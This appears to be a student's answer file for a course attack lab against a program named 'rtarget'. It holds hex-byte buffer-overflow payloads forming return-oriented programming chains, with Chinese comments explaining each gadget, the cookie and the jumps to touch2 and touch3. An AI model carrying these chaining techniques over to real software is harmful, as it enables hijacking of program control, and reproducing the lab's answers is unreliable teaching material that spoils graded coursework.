 /* 
 /* cat rtarget-exploit.txt | ./hex2raw | ./rtarget -q */ 
 /* 在本例中，栈帧不可运行 也就是说不能在rsp指示的空间中写可执行语句了 而且存在着栈随机初始化，就不能够精确定位了  */ 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* 跳到该可执行语句所在位置 执行pop %rax  addval_219 */ 
fa 97 b9 59 00 00 00 00 /* 这是cookie cookie就pop到了rax中 然后在addval_219又有一个ret */ 
c5 19 40 00 00 00 00 00 /* 那么跳到0x4019c5可执行语句所在位置执行rax到rdi的传送 */
ec 17 40 00 00 00 00 00 /* 然后又有个ret就返回到了touch2中 */ 
 /* 在整个过程中没有执行任何的rsp指向的内存栈中的语句 */ 
 /* 也就是说利用已有的可执行代码，提取出一些模式，再借助栈帧中的数据，就可以达到攻击的目的 */ 
 */ 

 /* 第五个实验和第四个实验大同小异 是一个体力活，如何在farm中组合出非常简单的逻辑 */ 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 下述的每个都是ret作为动力 */ 
06 1a 40 00 00 00 00 00 /* mov %rsp,%rax addval_190 这些都是通过ret读取rsp来起作用的 */ 
c5 19 40 00 00 00 00 00 /* mov %rax,%rdi  setval_426 */ 
ab 19 40 00 00 00 00 00 /* popq %rax */ 
48 00 00 00 00 00 00 00 /* 偏移量是0x48 这个值是从一开始gets那里返回23行到储存的字符串33行止 9*8=72 */ 
dd 19 40 00 00 00 00 00 /* mov %eax,%edx */ 
70 1a 40 00 00 00 00 00 /* mov %edx,%ecx */ 
13 1a 40 00 00 00 00 00 /* mov %ecx,%esi 这是由于没有直接的mov指令而通过已有的可执行代码组合起来的 */  
d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax 将储存的字符串的偏移的地址赋值给rax */ 
a2 19 40 00 00 00 00 00 /* mov %rax,%rdi 最后的字符串的地址是rdi 在进行判断时弄rdi即可 */ 
fa 18 40 00 00 00 00 00 /* 返回到touch3 */ 
35 39 62 39 39 37 66 61 /* 储存的字符串 */ 
